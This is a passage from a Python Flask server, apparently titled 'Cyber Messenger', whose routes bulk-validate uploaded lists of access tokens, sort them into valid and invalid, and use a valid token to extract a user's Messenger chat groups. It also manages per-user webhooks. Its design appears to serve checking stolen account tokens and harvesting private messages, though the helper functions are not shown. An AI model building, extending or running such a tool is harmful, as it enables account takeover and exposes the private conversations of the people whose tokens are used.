        return jsonify({'error': 'Failed to set webhook'})

@app.route('/check_tokens', methods=['POST'])
def check_tokens():
    try:
        tokens = []
        
        if 'token_file' in request.files and request.files['token_file'].filename:
            file = request.files['token_file']
            content = file.read().decode('utf-8')
            tokens = [line.strip() for line in content.split('\n') if line.strip()]
        elif 'single_token' in request.form and request.form['single_token']:
            tokens = [request.form['single_token'].strip()]
        
        if not tokens:
            return jsonify({'error': 'No tokens provided'})
        
        results = []
        valid_tokens = []
        invalid_tokens = []
        
        for token in tokens:
            if not token or len(token) < 10:
                results.append({"valid": False, "token": token, "error": "Invalid format"})
                invalid_tokens.append(token)
                continue
                
            result = check_token_validity(token)
            result['token'] = token
            results.append(result)
            
            if result['valid']:
                valid_tokens.append(token)
            else:
                invalid_tokens.append(token)
        
        return jsonify({
            'results': results,
            'summary': {'total': len(tokens), 'valid': len(valid_tokens), 'invalid': len(invalid_tokens)},
            'valid_tokens': valid_tokens,
            'invalid_tokens': invalid_tokens
        })
    except Exception:
        return jsonify({'error': 'Token check failed'})

@app.route('/extract_messenger_chats', methods=['POST'])
def extract_messenger_chats():
    try:
        token = request.form.get('token')
        
        if not token:
            return jsonify({'error': 'No token provided'})
        
        token_check = check_token_validity(token)
        if not token_check['valid']:
            return jsonify({'error': 'Invalid token'})
        
        messenger_chats = extract_messenger_chat_groups(token)
        
        return jsonify({
            'token_info': token_check,
            'messenger_chats': messenger_chats
        })
    except Exception:
        return jsonify({'error': 'Chat extraction failed'})

@app.route('/ping')
def ping():
    return 'pong'

def background_keep_alive():
    while True:
        try:
            requests.get('http://localhost:5000/ping', timeout=5)
        except:
            pass
        time.sleep(60)

def cleanup_old_sessions():
    while True:
        try:
            current_time = datetime.now()
            with sessions_lock:
                expired_sessions = []
                for user_id, user_data in user_sessions.items():
                    if (current_time - user_data['created_at']).total_seconds() > 86400:
                        expired_sessions.append(user_id)
                
                for user_id in expired_sessions:
                    if user_id in webhook_urls:
                        del webhook_urls[user_id]
                    del user_sessions[user_id]
        except:
            pass
        time.sleep(3600)

if __name__ == '__main__':
    keep_alive_thread = Thread(target=background_keep_alive, daemon=True)
    keep_alive_thread.start()
    
    cleanup_thread = Thread(target=cleanup_old_sessions, daemon=True)
    cleanup_thread.start()
    
    print("🚀 CYBER MESSENGER SERVER STARTED")
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
